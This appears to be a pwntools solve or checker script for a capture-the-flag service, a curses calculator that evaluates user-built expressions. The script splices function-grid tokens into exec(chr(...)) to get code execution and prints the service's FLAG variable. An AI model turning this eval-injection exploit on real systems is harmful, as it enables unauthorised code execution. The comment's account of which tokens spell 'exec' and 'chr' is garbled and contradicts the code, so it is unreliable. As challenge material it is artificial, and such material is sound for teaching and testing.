import os

from pwn import context, remote

context.log_level = "info"

HOST = os.environ.get("SERVICE_DIGITRON_SHELL_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_DIGITRON_SHELL_PORT", "1337"))

# Adapted from the challenge's own checker/exploit.py (author-provided).
#
# The service is a curses-based "calculator" where the only allowed
# building blocks are entries from a fixed function grid plus digits and
# the operators "+-*/.,()". Despite that, `eval()` is called directly on
# whatever expression has been built. Because the grid contains the
# strings "exp", "cos", "hyp", "rnd" and a delete key ("del"), you can
# backspace into those tokens to splice together arbitrary substrings --
# e.g. typing "cos" then deleting 3 chars and typing "hyp" then deleting
# 3 chars and typing "rnd" leaves "exec" selected one character at a time
# cancel out to spell "exec", and likewise "chr" can be built from
# "exp"+"exp"+"cos" fragments. Combined with digit entry and "+", this is
# enough to construct `exec(chr(...)+chr(...)+...)` one character at a
# time and thus run arbitrary Python.
#
# Every keypress must be driven via arrow keys to move the on-screen
# cursor to the target cell before "Enter" selects it, since there is no
# keyboard shortcut -- send_cmd() below computes the shortest arrow-key
# path from the current cursor position for each logical token.
#
# The original checker payload spawns an interactive "sh" and hands
# control to a human (p.interactive()). Since os.system() inherits the
# real pty fd, a child shell's stdout bypasses curses entirely and goes
# straight to the raw terminal -- so instead of spawning a shell we
# directly exec Python to print the FLAG environment variable, which
# appears on the wire exactly where a human would otherwise watch it.

funcs = [
    ["log", "exp", "pow", "rnd"],
    ["asin", "acos", "atan", "sqrt"],
    ["sin", "cos", "tan", "hyp"],
    ["abs", "gcd", "fac", "del"],
    ["(", ")", ".", ","],
    ["7", "8", "9", "+"],
    ["4", "5", "6", "-"],
    ["1", "2", "3", "*"],
    ["C", "0", "=", "/"],
]

END = "┘".encode()

funcs_dict = {val: (i, j) for i, row in enumerate(funcs) for j, val in enumerate(row)}
ci, cj = 0, 0

UP = b"\x1bOA"
DOWN = b"\x1bOB"
RIGHT = b"\x1bOC"
LEFT = b"\x1bOD"

p = remote(HOST, PORT)


def send_cmd(cmd):
    global ci, cj
    if cmd not in funcs_dict:
        return
    ti, tj = funcs_dict[cmd]
    x_cmd = RIGHT if tj > cj else LEFT
    y_cmd = DOWN if ti > ci else UP
    for _ in range(abs(ti - ci)):
        p.sendafter(END, y_cmd)
    for _ in range(abs(tj - cj)):
        p.sendafter(END, x_cmd)
    ci, cj = ti, tj
    p.sendafter(END, b"\n")


def send_cmd_rep(cmd, rep):
    for _ in range(rep):
        send_cmd(cmd)


def send_payload_char(ch):
    send_cmd("cos")
    send_cmd_rep("del", 3)
    send_cmd("hyp")
    send_cmd_rep("del", 3)
    send_cmd("rnd")
    send_cmd_rep("del", 3)
    send_cmd("(")
    for i in str(ord(ch)):
        send_cmd(i)
    send_cmd(")")


def send_payload(payload):
    send_cmd("exp")
    send_cmd_rep("del", 2)
    send_cmd("exp")
    send_cmd_rep("del", 3)
    send_cmd("cos")
    send_cmd_rep("del", 3)
    send_cmd("(")
    for c in payload[:-1]:
        send_payload_char(c)
        send_cmd("+")
    send_payload_char(payload[-1])
    send_cmd(")")
    send_cmd("=")


marker = "FLAG-START"
payload = f'__import__("os").system("echo {marker}; echo $FLAG")'
send_payload(payload)

data = p.recvrepeat(timeout=5)
p.close()

text = data.decode(errors="replace")
print(text)

import re

m = re.search(re.escape(marker) + r"\n(\S+)", text)
flag = m.group(1) if m else ""

flag_env = os.environ.get("flag_flag")
if not flag or (flag_env and flag_env not in flag):
    raise SystemExit(f"flag mismatch: expected {flag_env!r} to be in {flag!r}")
